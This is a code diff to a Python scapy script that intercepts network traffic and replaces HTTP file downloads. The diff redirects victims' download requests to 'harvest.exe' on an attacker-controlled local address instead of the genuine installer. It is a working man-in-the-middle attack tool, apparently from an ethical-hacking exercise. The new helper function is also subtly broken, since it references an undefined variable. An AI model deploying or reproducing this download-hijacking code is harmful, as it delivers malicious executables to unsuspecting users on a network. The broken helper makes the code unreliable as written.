@@ -5,6 +5,14 @@ import scapy.all as scapy
 ack_list = []
 
 
+def set_load(packet, load):
+    my_packet[scapy.Raw].load = load
+    del my_packet[scapy.IP].len
+    del my_packet[scapy.IP].chksum
+    del my_packet[scapy.TCP].chksum
+    return packet
+
+
 def process_packet(packet):
     my_packet = scapy.IP(packet.get_payload())
     if my_packet.haslayer(scapy.Raw):
@@ -17,12 +25,10 @@ def process_packet(packet):
             if my_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(my_packet[scapy.TCP].seq)
                 print("[+] Replacing download file...")
-                my_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: " \
-                                            "https://www.rarlab.com/rar/winrar-x32-611.exe\n "
-                del my_packet[scapy.IP].len
-                del my_packet[scapy.IP].chksum
-                del my_packet[scapy.TCP].chksum
-                packet.set_payload(str(my_packet))
+                modified_packet = set_load(my_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "
+                                                      "https://192.168.x.y/havesters/harvest.exe\n ")
+
+                packet.set_payload(str(modified_packet))
 
     packet.accept()
 
